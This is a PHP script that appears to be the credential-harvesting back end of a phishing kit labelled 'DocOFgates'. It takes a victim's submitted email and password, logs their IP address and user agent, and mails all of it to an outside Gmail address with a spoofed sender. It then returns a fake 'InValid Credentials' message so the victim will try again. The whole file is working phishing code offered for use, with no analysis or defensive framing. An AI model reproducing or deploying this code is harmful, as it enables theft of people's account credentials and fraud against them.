<?php
include '../blocker.php';
?>
<?php
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
$detail = trim($_POST['detail']);
if($ai != null && $pr != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #827f84;'>DocOFgates</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'>DocOFgates</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+]  <font style='color:#0a5d00;'>".$_POST['user']."</font><br>
<font style='color:#9c0000;'>√</font> [+] E9mail] = <font style='color:#0a5d00;'>".$ai."</font><br>
<font style='color:#9c0000;'>√</font> [+] PASS] = <font style='color:#0a5d00;'>".$pr."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'> DocOFgates </font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+]IP INFO] = <font style='color:#0a5d00;'>https://geoiptool.com/en/?ip=$ip\n</font><br>
<font style='color:#9c0000;'>√</font> [+]User agent] = <font style='color:#0a5d00;'>".$useragent."</font><br>
################## <font style='color: #827f84;'>DocOFgates</font> #####################
</div></html>\n";
$send = "glenyoder3@gmail.com";
$Z118_SUBJECT = "DocOFgates $ip\n";
        $Z118_HEADERS .= "From:Star-HKL<new@filsnoble.com>";
        $Z118_HEADERS .= $_POST['eMailAdd']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
        @mail($send, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	$msg = 'InValid Credentials';
	
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>